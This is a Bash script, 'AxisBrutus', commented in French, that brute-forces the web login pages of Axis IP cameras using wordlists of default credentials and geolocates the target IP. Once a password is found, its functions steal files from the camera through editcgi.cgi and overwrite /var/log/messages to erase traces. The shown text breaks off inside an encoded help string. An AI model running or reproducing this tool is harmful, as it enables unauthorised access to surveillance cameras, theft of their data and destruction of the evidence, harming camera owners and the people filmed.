#!/bin/bash
# CHORFA Alla-eddine
# h4ckr213dz@gmail.com
# https://github.com/dino213dz/
# Créé le 25.07.2019
####################################################################################################################
#                                                     AxisBrutus
####################################################################################################################
ab_auteur='CHORFA Alla-eddine'
ab_date_creation='25.07.2019'
ab_date_maj=$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 6)" "$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 7|rev|cut -d ":" -f 2-|rev)
ab_titre='AxisBrutus'
ab_ver='2.4'
ab_contact='h4ckr213dz@gmail.com'
ab_web='https://github.com/dino213dz/'
ab_slogan='La plus fine des brutes!'
ab_slogan_bravo='La brute a encore frappé!'
ab_slogan_defaite="Ce minus a esquivé toutes nos frappes! Donne moi plus de mots-de-passes et plus de logins à manger si tu veux qu'on gagne!"

####################################################################################################################
#                                                      VARIABLES
####################################################################################################################
dossier_mdps='./cracked'
mdp_wordlist='./wordlists/axis_mdp.txt'
users_wordlist='./wordlists/axis_users.txt'
fichier_mdp_trouve_default="AXIS_~MODELE~-IP_~IP~-INFOS.txt"
modele_nondetecte='AXIS inconnu inconnu'
fichier_mdp_trouve=$fichier_mdp_trouve_default
fichier_logs_defaut='./axisBrutus.log'
fichier_logs=$fichier_logs_defaut
tmp='/tmp/axis.html'

#Inti. var. styles
rouge='\033[1;31m'
rouge_fonce='\033[0;31m'
jaune='\033[1;33m'
jaune_fonce='\033[0;33m'
vert='\033[1;32m'
vert_fonce='\033[0;32m'
cyan='\033[1;36m'
cyan_fonce='\033[0;36m'
bleu='\033[1;34m'
bleu_fonce='\033[0;34m'
magenta='\033[1;35m'
magenta_fonce='\033[0;35m'
blanc='\033[1;37m'
gris='\033[0;37m'
italic='\033[3m'
souligne='\033[4m'
reset='\033[0m'


#BANNIERES
#Banniere principale:
banniere='IOKWhOKWhOKWhCAgICAgIOKWkuKWiOKWiCAgIOKWiOKWiOKWkiDilojilojilpMgIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paE4paE4paE4paEICAgIOKWiOKWiOKWgOKWiOKWiOKWiCAgIOKWiCAgICDilojilogg4paE4paE4paE4paI4paI4paI4paI4paI4paTIOKWiCAgICDilojiloggICDilojilojilojilojilojiloggCuKWkuKWiOKWiOKWiOKWiOKWhCAgICDilpLilpIg4paIIOKWiCDilpLilpHilpPilojilojilpLilpLilojiloggICAg4paSIOKWk+KWiOKWiOKWiOKWiOKWiOKWhCDilpPilojilogg4paSIOKWiOKWiOKWkiDilojiloggIOKWk+KWiOKWiOKWkuKWkyAg4paI4paI4paSIOKWk+KWkiDilojiloggIOKWk+KWiOKWiOKWkuKWkuKWiOKWiCAgICDilpIgCuKWkuKWiOKWiCAg4paA4paI4paEICDilpHilpEgIOKWiCAgIOKWkeKWkuKWiOKWiOKWkuKWkSDilpPilojilojiloQgICDilpLilojilojilpIg4paE4paI4paI4paT4paI4paIIOKWkeKWhOKWiCDilpLilpPilojiloggIOKWkuKWiOKWiOKWkeKWkiDilpPilojilojilpEg4paS4paR4paT4paI4paIICDilpLilojilojilpHilpEg4paT4paI4paI4paEICAgCuKWkeKWiOKWiOKWhOKWhOKWhOKWhOKWiOKWiCAg4paRIOKWiCDilogg4paSIOKWkeKWiOKWiOKWkSAg4paSICAg4paI4paI4paS4paS4paI4paI4paR4paI4paAICDilpLilojilojiloDiloDilojiloQgIOKWk+KWk+KWiCAg4paR4paI4paI4paR4paRIOKWk+KWiOKWiOKWkyDilpEg4paT4paT4paIICDilpHilojilojilpEgIOKWkiAgIOKWiOKWiOKWkgog4paT4paIICAg4paT4paI4paI4paS4paS4paI4paI4paSIOKWkuKWiOKWiOKWkuKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkuKWkeKWk+KWiCAg4paA4paI4paT4paR4paI4paI4paTIOKWkuKWiOKWiOKWkuKWkuKWkuKWiOKWiOKWiOKWiOKWiOKWkyAgIOKWkuKWiOKWiOKWkiDilpEg4paS4paS4paI4paI4paI4paI4paI4paTIOKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkgog4paS4paSICAg4paT4paS4paI4paR4paS4paSIOKWkSDilpHilpMg4paR4paR4paTICDilpIg4paS4paT4paSIOKWkiDilpHilpHilpLilpPilojilojilojiloDilpLilpEg4paS4paTIOKWkeKWkuKWk+KWkeKWkeKWkuKWk+KWkiDilpIg4paSICAg4paSIOKWkeKWkSAgIOKWkeKWkuKWk+KWkiDilpIg4paSIOKWkiDilpLilpPilpIg4paSIOKWkQogIOKWkiAgIOKWkuKWkiDilpHilpHilpEgICDilpHilpIg4paRIOKWkiDilpHilpEg4paR4paSICDilpEg4paR4paS4paR4paSICAg4paRICAg4paR4paSIOKWkSDilpLilpHilpHilpHilpLilpEg4paRIOKWkSAgICAg4paRICAgIOKWkeKWkeKWkuKWkSDilpEg4paRIOKWkSDilpHilpIgIOKWkSDilpEKICDilpEgICDilpIgICAg4paRICAgIOKWkSAgIOKWkiDilpHilpEgIOKWkSAg4paRICAg4paRICAgIOKWkSAgIOKWkeKWkSAgIOKWkSAg4paR4paR4paRIOKWkSDilpEgICDilpEgICAgICAg4paR4paR4paRIOKWkSDilpEg4paRICDilpEgIOKWkSAgCiAgICAgIOKWkSAg4paRIOKWkSAgICDilpEgICDilpEgICAgICAgIOKWkSAgIOKWkSAgICAgICAgIOKWkSAgICAgICAg4paRICAgICAgICAgICAgICAgICDilpEgICAgICAgICAgIOKWkSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo='
#Banniere dino213dz
banniere_dino213dz='X19fX19fX18gIC5fX18gX19fX19fXyAgIF9fX19fX19fICAgX19fX19fX18gIF9fX19fX19fX19fXyBfX19fX19fXyAgX19fX19fX19fXwpcX19fX19fIFwgfCAgIHxcICAgICAgXCAgXF9fX19fICBcICBcX19fX18gIFwvXyAgIFxfX19fXyAgXFxfX19fX18gXCBcX19fXyAgICAvCiB8ICAgIHwgIFx8ICAgfC8gICB8ICAgXCAgLyAgIHwgICBcICAvICBfX19fLyB8ICAgfCBfKF9fICA8IHwgICAgfCAgXCAgLyAgICAgLyAKIHwgICAgYCAgIFwgICAvICAgIHwgICAgXC8gICAgfCAgICBcLyAgICAgICBcIHwgICB8LyAgICAgICBcfCAgICBgICAgXC8gICAgIC9fIAovX19fX19fXyAgL19fX1xfX19ffF9fICAvXF9fX19fX18gIC9cX19fX19fXyBcfF9fXy9fX19fX18gIC9fX19fX19fICAvX19fX19fXyBcCiAgICAgICAgXC8gICAgICAgICAgICBcLyAgICAgICAgIFwvICAgICAgICAgXC8gICAgICAgICAgIFwvICAgICAgICBcLyAgICAgICAgXC8K'
#Banniere fichier export
banniere_export='ICBfXyAgIF8gIF8gIF9fICBfX19fICBfX19fICBfX19fICBfICBfICBfX19fICBfICBfICBfX19fIAogLyBfXCAoIFwvICkoICApLyBfX18pKCAgXyBcKCAgXyBcLyApKCBcKF8gIF8pLyApKCBcLyBfX18pCi8gICAgXCApICAoICApKCBcX19fIFwgKSBfICggKSAgIC8pIFwvICggICkoICApIFwvIChcX19fIFwKXF8vXF8vKF8vXF8pKF9fKShfX19fLyhfX19fLyhfX1xfKVxfX19fLyAoX18pIFxfX19fLyhfX19fLwo='
#Banniere effacementLogs:
#droid
banniere_logs='ICAgICAgICAgICAgICAuYW5kQUhIQWJubi4KICAgICAgICAgICAuYUFISEhBQVVVQUFISEhBbi4KICAgICAgICAgIGRIUF5+IiAgICAgICAgIn5eVEhiLgogICAgLiAgIC5BSEYgICAgICAgICAgICAgICAgWUhBLiAgIC4KICAgIHwgIC5BSEhiLiAgICAgICAgICAgICAgLmRISEEuICB8CiAgICB8ICBISEFVQUFIQWJuICAgICAgYWRBSEFBVUFIQSAgfAogICAgSSAgSEZ+Il9fX19fICAgICAgICBfX19fIF1ISEggIEkKICAgSEhJIEhBUEsiIn5eWVVIYiAgZEFISEhISEhISEhIIElISAogICBISEkgSEhIRD4gLmFuZEhIICBISFVVUF5+WUhISEggSUhICiAgIFlVSSBdSEhQICAgICAiflkgIFB+IiAgICAgVEhIWyBJVVAKICAgICIgIGBISyAgICAgICAgICAgICAgICAgICBdSEgnICAiCiAgICAgICAgVEhBbi4gIC5kLmFBQW4uYi4gIC5kSEhQCiAgICAgICAgXUhISEhBQVVQIiB+fiAiWVVBQUhISEhbCiAgICAgICAgYEhIUF5+IiAgLmFubm4uICAifl5ZSEgnCiAgICAgICAgIFlIYiAgICB+IiAiIiAifiAgICBkSEYKICAgICAgICAgICJZQWIuLmFiZEhIYm5kYm5kQVAiCiAgICAgICAgICAgVEhIQUFiLiAgLmFkQUhIRgogICAgICAgICAgICAiVUhISEhISEhISEhVIgogICAgICAgICAgICAgIF1ISFVVSEhISEhIWwogICAgICAgICAgICAuYWRISGIgIkhISEhIYm4uCiAgICAgLi5hbmRBQUhISEhISGIuQUhISEhISEhBQWJubi4uCi5uZEFBSEhISEhIVVVISEhISEhISEhIVVBefiJ+XllVSEhIQUFibi4KICAifl5ZVUhIUCIgICAifl5ZVUhIVVAiICAgICAgICAiXllVUF4iCiAgICAgICAiIiAgICAgICAgICJ+fiIK'
#Banniere diverses:
#bravo
banniere_bravo='4paE4paE4paE4paEwrcg4paE4paE4paEICAg4paE4paE4paEwrcgIOKWjCDilpDCtyAgICAgIOKWhOKWhCAK4paQ4paIIOKWgOKWiOKWquKWgOKWhCDilojCt+KWkOKWiCDiloDilogg4paq4paIwrfilojilozilqogICAgIOKWiOKWiOKWjArilpDilojiloDiloDilojiloTilpDiloDiloDiloQg4paE4paI4paA4paA4paIIOKWkOKWiOKWkOKWiOKAoiDiloTilojiloDiloQg4paQ4paIwrcK4paI4paI4paE4paq4paQ4paI4paQ4paI4oCi4paI4paM4paQ4paIIOKWquKWkOKWjCDilojilojilogg4paQ4paI4paMLuKWkOKWjC7iloAgCsK34paA4paA4paA4paAIC7iloAgIOKWgCDiloAgIOKWgCAuIOKWgCAgIOKWgOKWiOKWhOKWgOKWqiDiloAgCg=='
banniere_bravo='IF9fX19fXyAgICAgX19fX19fICAgICBfX19fX18gICAgIF9fICAgX18gICBfX19fX18gICAgCi9cICA9PSBcICAgL1wgID09IFwgICAvXCAgX18gXCAgIC9cIFwgLyAvICAvXCAgX18gXCAgIApcIFwgIF9fPCAgIFwgXCAgX188ICAgXCBcICBfXyBcICBcIFwgXCcvICAgXCBcIFwvXCBcICAKIFwgXF9fX19fXCAgXCBcX1wgXF9cICBcIFxfXCBcX1wgIFwgXF9ffCAgICBcIFxfX19fX1wgCiAgXC9fX19fXy8gICBcL18vIC9fLyAgIFwvXy9cL18vICAgXC9fLyAgICAgIFwvX19fX18vIAo='
banniere_tryagain='IF9fX19fXyAgIF9fX19fXyAgICAgX18gIF9fICAgICAgICBfX19fX18gICAgIF9fX19fXyAgICAgX19fX19fICAgICBfXyAgICAgX18gICBfXyAgICAKL1xfXyAgX1wgL1wgID09IFwgICAvXCBcX1wgXCAgICAgIC9cICBfXyBcICAgL1wgIF9fX1wgICAvXCAgX18gXCAgIC9cIFwgICAvXCAiLS5cIFwgICAKXC9fL1wgXC8gXCBcICBfXzwgICBcIFxfX19fIFwgICAgIFwgXCAgX18gXCAgXCBcIFxfXyBcICBcIFwgIF9fIFwgIFwgXCBcICBcIFwgXC0uICBcICAKICAgXCBcX1wgIFwgXF9cIFxfXCAgXC9cX19fX19cICAgICBcIFxfXCBcX1wgIFwgXF9fX19fXCAgXCBcX1wgXF9cICBcIFxfXCAgXCBcX1xcIlxfXCAKICAgIFwvXy8gICBcL18vIC9fLyAgIFwvX19fX18vICAgICAgXC9fL1wvXy8gICBcL19fX19fLyAgIFwvXy9cL18vICAgXC9fLyAgIFwvXy8gXC9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK'
#aide
banniere_aide=$banniere_export

taille_barre_progression=40
barre_car_fait="■"
barre_car_restant="■"
barre_col_fait="\033[0m\033[1;42;32m"
barre_col_restant="\033[0m\033[0;44;36m"
barre_col_texte="\033[1;33m"

#Inti. var. travail
curl_timeout_default=5
curl_timeout=$curl_timeout_default
curl_maxtime_default=10
curl_maxtime=$curl_maxtime_default
ping_timeout_default=10
ping_timeout=$ping_timeout_default
min_timeout=3
succes='Administration'
echec='Unauthorized'
msg_succes="Authentification réussie! ([P4wn3d])"
msg_echec="Echec de l'authentification!"
heure_depart=$(/bin/date +%s)
mdp_trouve=''
echec_js=''
echec_404=''
skipModeleDetect='NON'
skipGeo='NON'
checkOnly='NON'
modeVerbose='NON'
total_fait=0
modeles_verifie=''
urlforced=''
exportforced=''
args=("$@")
#args=(${args[@]} "fin" ) # ajotuer un dernier argument
nb_args=$#

#liste des modeles testés
liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" "211" "211M" "212" "213" "214" "215" "221" "223M" "225FD" "233D" "243SA" "240Q" "241Q" "241S" "247S" "2100" "2110" "2120" "2401+" "F44" "M1004-W" "M1011" "M1011-W" "M1013" "M1014" "M1025" "M1031-W" "M1034-W" "M1054" "M1065-L" "M1104" "M1113" "M1114" "M1124" "M1125" "M20" "M2025-LE" "M3004" "M3005" "M3006" "M3007" "M3011" "M3024-L" "M3025" "M3026" "M3027" "M3045-V" "M3104-LVE" "M3113" "M3204" "M5014" "M5014-V" "M7001" "M7011" "M7014" "M7016" "P12" "P12/M20" "P1343" "P1344" "P1346" "P1347" "P1354" "P1355" "P1357" "P1365" "P1405-LE" "P1425-E" "P1427-LE" "P1428-E" "P3224-LV" "P3225-LVE" "P3304" "P3343" "P3344" "P3346" "P3354" "P3363" "P3364" "P3364-L" "P3365" "P3367" "P5414-E" "P5415-E" "P5512" "P5512-E" "P5532" "P5532-E" "P5534-E" "P5635-E" "P7214" "Q1604" "Q1755" "Q1765-LE" "Q1775" "Q6032-E" "Q6034-E" "Q6035-E" "Q6042" "Q6042-E" "Q6044-E" "Q6045-E" "Q6054-E" "Q6055-E" "Q6128-E" "Q7401")

####################################################################################################################
#                                                       FONCTIONS
####################################################################################################################



#FUNCTION:
# detecte si erreur 401 : page non autorisée
function checkConnectiviteCible {
	#ping_timeout=10
	packets_perdus=$(/bin/ping -W $ping_timeout -c 1 $ip_only 2>/dev/null|grep '%'|cut -d ' ' -f 6|cut -d '%' -f 1)
	packets_perdus=$(echo $packets_perdus|egrep "[0-9]*")
	if [ "$packets_perdus" != "" ];then
		if [ $packets_perdus -ne 0 ];then
			echo "ECHEC"
		else
			echo "SUCCES"
		fi
	else
		echo "ECHEC"
	fi
	}

#FUNCTION:
# detecte le modele de la camera axis et la version du firmware si disponible: <AXIS modele Network Camera X.XX>
# elle recupere l'info depuis la balise <TITLE> de la fenetre
# l'url ciblee depend du modele de la camera
function fullModeleDetect {

	ip_cam=$1
	
	url_a_verifier=( "/index2.shtml" "/view/index.shtml" "/view/index2.shtml?newstyle=&cam=" "/view/view.shtml?id=354&imagepath=%2Fmjpg%2Fvideo.mjpg&size=1" "/view/viewer_index.shtml" "/admin/admin.shtml" "/" )

	
	for url_possible in ${url_a_verifier[*]}; do	
		modele_complet=$(/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -k -s "http://$ip_cam$url_possible"  |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)	
				
		if [[ "$modele_complet" = "" ]] ||  [[ "$modele_complet" = " " ]] || [[ -z "${modele_complet##*Bad*}" ]] || [[ -z "${modele_complet##*Index*}" ]] || [[ -z "${modele_complet##*Unauthorized*}" ]] ||   [[ -z "${modele_complet##*Not*}" ]]  ||  [[ -z "${modele_complet##*page*}" ]] ;then
			modele_complet=$modele_nondetecte
			continue
		else 
			break
		fi

	done

	echo $modele_complet
	}



#FUNCTION:
# detecte si erreur 401 : page non autorisée
function checkUrlProtegee {
	url_checker_p=$1	
	test_url_p=$(/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_p|grep -i '401 ')
	if [ ${#test_url_p} -gt 0 ];then
		protegee='OUI'
	else
		protegee="NON"
	fi
	echo $protegee
	}

#FUNCTION:
# detecte si erreur 404 : page introuvable
function checkUrlExiste {
	url_checker_e=$1	
	test_url_e=$(/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_e|grep -i '404 ')
	if [ ${#test_url_e} -gt 0 ];then
		existe="NON"
	else
		existe='OUI'
	fi
	echo $existe
	}

#FUNCTION:
# detecte le modele de la camera axis
function modeleExtract {
	#pb ici : les modeles ne sont plus corrects suite à la creation des fonctions
	m_c_cam="$1"
	m_c_cam=$(echo -e "$m_c_cam"|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
	m_c_cam=${m_c_cam/.*[aA][xX][iI][sS]/axis}
	echo -e "$m_c_cam"

	}

#FUNCTION:
# detecte la version du firmware
function versionDetect {
	v_c_cam=$1	
	v_c_cam=$(echo $v_c_cam|rev|cut -d " " -f 1|rev)
	echo $v_c_cam

	}

#FUNCTION:
# definit l'url à attaquer selon le modele
function urlModele {
	ip_cam=$1	
	modele_cam=$2	
	# modele par defaut : le plus commun	
	url_cam="http://$ip_cam/operator/basic.shtml"

	# old generation
	if  [ "$modele_cam" = "2100" ] || [ "$modele_cam" = "2110" ] || [ "$modele_cam" = "2120" ] || [ "$modele_cam" = "2401+" ] || [ "$modele_cam" = "2401" ];then 
		url_cam="http://$ip_cam/admin/admin.shtml" 
	fi

	# AXIS Q6055-E : contient du JS
	if [ "$modele_cam" = "Q6054-E" ] ;then 
		url_cam="http://$ip_cam/axis-cgi/admin/paramlist.cgi"
	fi

	# AXIS P3367
	#if [ "$modele_cam" = "P3367" ] ;then 
	#	url_cam="http://$ip_cam/operator/videostream.shtml?id=1312"
	#fi
	
		
	# Page introuvable
	if [[ "$modele_cam" =~ "N/A" ]] || [[ "$modele_cam" =~ "inconnu" ]] || [[ "$modele_cam" = "" ]] || [[ "$modele_cam" = " " ]];then 
		url_tester_aleatoirement=( "/operator/basic.shtml" "/admin/admin.shtml" "/admin/users.shtml" "/view/indexFrame.shtml" "" )
		#echo $url_tester_aleatoirement
		test_url_existe='NON'
		test_url_protect='NON'
		for url_de_test in ${url_tester_aleatoirement[*]} ;do
			url_cam="http://$ip_cam$url_de_test"
			test_url_existe=$(checkUrlExiste $url_cam)
			if [ "$test_url_existe" = 'OUI' ];then
				test_url_protect=$(checkUrlProtegee $url_cam)
				if [[ "$test_url_protect" =~ 'OUI' ]];then
					break
				fi
			fi
		done
	fi
	
	#si quand meme on ne trouve pas de page protegee a attaquer: on attaque la racine directement
	test_url=$(checkUrlExiste $url_cam)
	if [[ "$test_url" =~ 'NON' ]]; then 
		url_cam="http://$ip_cam/"
	fi
	echo $url_cam
	}

#FUNCTION:
# 
function infosGeolocalisation {
	ip_port=$1
	ip_only=${ip_port%:*}

	infosDbIpDotCom=$(/usr/bin/curl -ks http://api.db-ip.com/v2/free/$ip_only)

	#retirer les infos inutiles
	infosDbIpDotCom=${infosDbIpDotCom/'"ipAddress'*[0-9]'",'/''}
	#infosDbIpDotCom=${infosDbIpDotCom/continentCode*countryName:/'Pays:'}
	

	#Mise en forme pour le script
	infosDbIpDotCom=${infosDbIpDotCom/'}'/''}
	infosDbIpDotCom=${infosDbIpDotCom/'{'/''}
	infosDbIpDotCom=${infosDbIpDotCom//'"'/''}	
	
	#Traduction
	infosDbIpDotCom=${infosDbIpDotCom/'continentCode:'/'Code continent:'}
	infosDbIpDotCom=${infosDbIpDotCom/'continentName:'/'Continent:'}
	infosDbIpDotCom=${infosDbIpDotCom/'countryCode:'/'Code pays:'}
	infosDbIpDotCom=${infosDbIpDotCom/'countryName:'/'Pays:'}
	infosDbIpDotCom=${infosDbIpDotCom/'stateProvCode:'/'Code état:'}
	infosDbIpDotCom=${infosDbIpDotCom/'stateProv:'/'Département/Etat:'}
	infosDbIpDotCom=${infosDbIpDotCom/'city:'/'Ville/Commune:'}

	echo $infosDbIpDotCom
	}

#FUNCTION:
# 
function addZeros {
	nombre_max=$1
	nombre_actuel=$2	
	serie_de_zeros=''

	nb_zeros=$(( ${#nombre_max} - ${#nombre_actuel} -1 ))
	for noz in $(seq 0 $nb_zeros); do
		serie_de_zeros="0"$serie_de_zeros
	done

	echo $serie_de_zeros$nombre_actuel
	}

#FUNCTION:
# verifie l'existence des fichiers
function fichierExiste {
	fichier_a_verifier=$1

	if [[ -f $fichier_a_verifier ]];then
		resultat='OUI'
	else
		resultat='NON'
	fi
	
	echo $resultat
	}

#FUNCTION:
# verifie l'existence des fichiers
function effacerTraces {
	ip_cam=$1
	
	fichiers_a_vider=('/var/log/messages' '/var/log/messages.old')

	fichier_temp='/tmp/fichier_vole.txt'	
	contenu=$(echo -e $banniere_logs|base64 -d)
	
	for fic_a_vid in ${fichiers_a_vider[*]} ;do
		/usr/bin/curl -ks "http://$ip_cam/admin-bin/editcgi.cgi?file=$fic_a_vid" -d "save_file=$fic_a_vid&mode=0100666&convert_crlf_to_lf=on&submit= Save file &content=$contenu" --connect-timeout $curl_timeout --max-time $curl_maxtime --user $user:$mdp > $fichier_temp 
	done
	
	}

#FUNCTION:
# verifie l'existence des fichiers
function voleFichier {
	ip_cam=$1
	fichier_a_voler=$2
	fichier_temp='/tmp/fichier_vole.txt'
	url_vole="http://$ip_cam/admin-bin/editcgi.cgi?file=$fichier_a_voler"
	/usr/bin/curl -ks --connect-timeout $curl_timeout --max-time $curl_maxtime "$url_vole" --user $user:$mdp  > $fichier_temp #silent_get=$()
	fichier_vole=''
	record=''
	while read ligne; do
		if [[ "$ligne" =~ '</textarea' ]];then
			record='OFF'
			fichier_vole=$fichier_vole${ligne/'</textarea>'/''}"\n"
		fi
		if [[ "$record" = "ON" ]];then
			#ligne vides?!
			#if [[ "${ligne// /}" != "" ]];then
				#fichier_vole=$fichier_vole$ligne"\n"
			fichier_vole=$fichier_vole${ligne//\\r/\\n}"\n"
			#fi
		fi

		if [[ "$ligne" =~ '<textarea' ]];then
			record='ON'
		fi
		
	done < $fichier_temp

	echo -en $fichier_vole

	}


#FUNCTION:
# verifie l'existence des fichiers
function ajouterEspacesSlogans {
	texte="$1"
	espaces="$2"
	banniereEnUneLigne=$(echo -e $banniere|base64 -d)

	largeurTexte=${#texte}
	largeurBanniere=$(( ${#banniereEnUneLigne}/10 ))
	tailleEspaces=$(( $largeurBanniere - $largeurTexte ))

	for e in $(seq 1 $tailleEspaces); do 
		espaces=$espaces$italic" "
	done
	
	echo $espaces
	}


#FUNCTION:
# verifie l'existence des fichiers
function afficherAide {
	aide_texte="IyBBWElTIEJSVVRVUwoKIyBBIHByb3BvczoKLSBBdXRldXI6IENIT1JGQSBBbGxhLWVkZGluZQotIENyw6llIGxlOiAyNS4wNy4yMDE5Ci0gRWRpdMOpIGxlOiAwMi4wOC4yMDE5Ci0gVmVyc2lvbjogMi40Ci0gQ29udGFjdDogaDRja3IyMTNkekBnbWFpbC5jb20KLSBXZWI6IGh0dHA6Ly9kaW5vMjEzZHouZnJlZS5mcgoKIyBEZXNjcmlwdGlvbjoKLSBMYSBwbHVzIGZpbmUgZGVzIGJydXRlcyEKLSBCcnV0ZSBmb3JjZSBsZXMgaW50ZXJmYWNlcyB3ZWIgZGVzIGNhbWVyYXMgSVAgQVhJUwotIE7DqWNlc3NpdGUgdW4gZmljaGllciBtZHAgZXQgdW4gZmljaGllciB1c2VybmFtZXMgOgoJMS0gLi93b3JkbGlzdHMvYXhpc191c2Vycy50eHQKCTItIC4vd29yZGxpc3RzL2F4aXNfbWRwLnR4dAotIENlcyBmaWNoaWVycyBjb250aWVubmVudCBsZXMgbG9naW5zIGV0IG1vdC1kZS1wYXNzZSBwYXIgZMOpZmF1dCBkZXMgY2Ftw6lyYXMgQXhpcy4KCiMgQWxnb3JpdGhtZToKLSBWw6lyaWZpZXIgbGVzIGTDqXBlbmRhbmNlcwotIFZlcmlmaWVyIGxlcyBwYXJhbcOodHJlcyBldCBsZXMgZmljaGllcnMKLSBWZWlmaWVyIGxhIGNvbm5lY3Rpdml0w6kgZGUgbGEgY2libGUKLSBSw6ljdXBlcmVyIGxlIG1vZMOobGUgZGUgbGEgY2Ftw6lyYQotIFJlY3VwZXJlciBsZSBmaXJtd2FyZQotIFJlY2hlcmNoZSBkJ1VSTCBwcm90w6lnw6llIHBhciBtb3QtZGUtcGFzc2UKLSBCcnV0ZSBmb3JjZQotIFNpIG1vdCBkZSBwYXNzZSB0cm91dsOpOgotIFTDqWzDqWNoYXJnZXIgbGVzIGZpY2hpZXJzIGRlIGNvbmZpZ3VyYXRpb24KLSBTYXV2ZWdhcmRlIGRlcyBkb25uw6llcwotIEVmZmFjZXIgbGVzIGxvZ3MKCiMgU3ludGF4ZToKLSAkPiAuL2F4aXNCcnV0dXMuc2ggLWMgSVA6UE9SVCBbT1BUSU9OU10KCiMgUGFyYW3DqHRyZXMgb2JsaWdhdG9pcmVzOgotIC0tY2libGUsIC1jIDogSVAsIElQOlBPUlQsIFVSTAoKIyBQYXJhbWV0cmVzIG9wdGlvbm5lbHM6Ci0gLS1za2lwLCAtcyA6IE4nZWZmZWN0dWUgcGFzIGxhIGTDqXRlY3Rpb24gZHUgbW9kw6hsZS4gTCd1cmwgY2libGUgc2VyYSAiL29wZXJhdG9yL2Jhc2ljLnNodG1sIiBxdWkgZXN0IGxhIHBsdXMgcHJvYmFibGUuIEwnYXJndW1lbnQgLS11cmwgcGV1dCDDqnRyZSB1dGlsaXPDqSBwb3VyIGNoYW5nZXIgbCd1cmwgY2libGUuCi0gLS1saXN0LCAtbCA6IGxpc3RlIGxlcyBtb2TDqGxlcyBkZSBjYW3DqXJhIGNvbXBhdGlibGVzCi0gLS1oZWxwLCAtaCA6IGFmZmljaGUgbCdhaWRlCi0gLS1uby1nZW8sIC0tbm9nZW8sIC1nIDogRMOpc2FjdGl2ZSBsYSBnw6lvbG9jYWxpc2F0aW9uIGRlIGwnSVAKLSAtLWNoZWNrLCAtLWNoayA6IFbDqXJpZmllIHVuaXF1ZW1lbnQgbGEgY29tcGF0aWJpbGl0w6kgZCd1biBtb2TDqGxlIHNhbnMgcHJvY8OpZGVyIMOgIGwnYXR0YXF1ZQotIC0tbG9nLCAtLWxvZ3MgOiBEw6lmaW5pdCBsJ2VtcGxhY2VtZW50IGR1IGZpY2hpZXIgbG9ncyBkZXMgb3DDqXJhdGlvbnMgZCdhdHRhcXVlLiBMYSB2YWxldXIgcGFyIGTDqWZhdXQgZXN0IDogLi9heGlzQnJ1dHVzLmxvZwotIC0tcGFzc3dvcmRzLCAtcCA6IGZpY2hpZXIgd29yZGxpc3QgY29udGVuYW50IGxhIGxpc3RlIGRlcyBtb3RzLWRlLXBhc3NlCi0gLS11c2VybmFtZXMsIC11OiBmaWNoaWVyIHdvcmRsaXN0IGNvbnRlbmFudCBsYSBsaXN0ZSBkZXMgbm9tcyBkJ3V0aWxpc2F0ZXVycwotIC0tZXhwb3J0LCAtLW91dHB1dCwgLW8gOiBmaWNoaWVyIGRhbnMgbGVxdWVsIGxlIG1vdC1kZS1wYXNzZSBzZXJhIGVucmVnaXN0csOpIHMnaWwgZXN0IHRyb3V2w6kuIEF1Y3VuIGZpY2hpZXIgY3LDqcOpIHNpIGxlIG1vdC1kZS1wYXNzZSBuJ2VzdCBwYXMgdHJvdXbDqQotIC0tdXJsLCAtciA6IEwndXJsIGTDqXBlbmQgZHUgbW9kw6hsZS4gVm91cyBwb3V2ZXogbGUgbW9kaWZpZXIgc2kgdm91cyBzb3VoYWl0ZXogdGVzdGVyIHVuZSBwYWdlIHdlYiBiaWVuIHByw6ljaXNlIChjYXMgZCd1biBtb2TDqGxlIGluY29ubnUgcGFyIGV4ZW1wbGUpCi0gLS12ZXJib3NlLCAtdiA6IHBlcm1ldCBkJ2FmZmljaGVyIHBsdXMgb3UgbW9pbnMgZCdpbmZvcyDDoCBsJ8OpY3Jhbi4gU2kgdmVyYmV1eCBhbG9ycyA6IEdhcmRlIMOgIGwnZWNyYW4gbGVzIGNvbWJpbmFpc29ucyB0ZXN0w6llcyAmIGFmZmljaGUgbGUgY29udGVudSBkZXMgZmljaGllcnMgdMOpbMOpY2hhcmfDqXMKLSAtLXRpbWVvdXQsIC10IDogZMOpZmluaXQgbGUgdGVtcHMgZGUgcsOpcG9uc2UgbGltaXRlIGRhbnMgY3VybAotIC0tbWF4dGltZSwgLW0gOiBkw6lmaW5pdCBsZSB0ZW1wcyBsaW1pdGUgZCd1bmUgcmVxdcOqdGUgY3VybAotIC0tcGluZy10aW1lb3V0IDogZMOpZmluaXQgbGUgdGltZW91dCBkdSB0ZXN0IGRlIGNvbm5lY3Rpdml0w6kgKHBpbmcpCi0gLS1pZ25vcmUsIC1pIDogaWdub3JlciBsZSByw6lzdWx0YXQgZHUgdGVzdCBkZSBjb25uZWN0aXZpdMOpIChhdHRhcXVlciBkYW5zIHRvdXMgbGVzIGNhcykKCiMgRXhlbXBsZXM6Ci0gQXR0YXF1ZSBzdGFuZGFyZCBwYXIgaXAgb3UgcGFyIHVybC4gbGVzIHdvcmRsaXN0IHV0aWxpc8OpcyBpY2kgc29udCBjZXV4IHBhciBkw6lmYXV0LiAoVm9pciAiRGVzY3JpcHRpb24iKQoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MwoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC